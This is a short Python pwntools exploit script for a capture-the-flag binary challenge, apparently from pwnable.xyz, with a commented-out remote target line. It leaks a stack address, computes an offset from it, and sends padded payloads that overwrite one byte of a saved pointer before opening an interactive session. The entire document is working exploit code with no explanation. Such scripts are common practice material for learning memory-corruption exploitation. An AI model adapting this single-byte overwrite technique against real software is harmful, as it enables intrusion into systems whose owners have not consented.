from pwn import *
target=process('./challenge')
#target=remote('svc.pwnable.xyz',30012)

def init(option):
	print(target.recvuntil("> "))
	target.sendline(str(option))

def re():
	init(1)

def xor():
	init(2)

def leak():
	init(3)
	leak=int(target.recvline().strip()[2:],16)
	return leak

sl=leak()
rbp=sl-0xf8
tar=rbp+0x9
byte=int(hex(tar)[12:14],16)
print(target.recvuntil(b"> "))
payload=b'\x77'+b"\n"+b"\x00"
payload+=b"A"*(0x20-len(payload))
payload+=p8(byte)
target.send(payload)

print(target.recvuntil("> "))
payload=b'\x01'+b"\n"+b"\x00"
payload+=b"A"*(0x20-len(payload))
payload+=p8(byte-9)
target.send(payload)

target.interactive()
